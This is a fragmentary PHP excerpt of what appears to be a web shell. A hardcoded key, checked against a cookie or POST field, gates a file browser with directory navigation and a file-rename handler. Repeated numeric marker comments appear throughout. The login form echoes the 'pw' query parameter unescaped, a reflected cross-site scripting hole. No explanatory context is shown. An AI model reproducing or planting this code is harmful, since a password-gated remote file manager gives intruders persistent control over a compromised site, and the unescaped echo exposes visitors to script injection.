...
$auth_key = "c4e106a89bcec806154f5ae83a782ce0";
...
$pass = false;
if (isset($_COOKIE['pw_name_34819'])) {
    if(($_COOKIE['pw_name_34819']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_34819'])) {
        if(($_POST['pw_name_34819']) == $auth_key) {
            setcookie("pw_name_34819", $_POST['pw_name_34819']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_34819' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1720672633976170 1720672633732820 1720672633974955 1720672633843272
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1720672633976170 1720672633732820 1720672633974955 1720672633843272
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1720672633976170 1720672633732820 1720672633974955 1720672633843272
            $name = PATH . "/" . $_GET['r'];
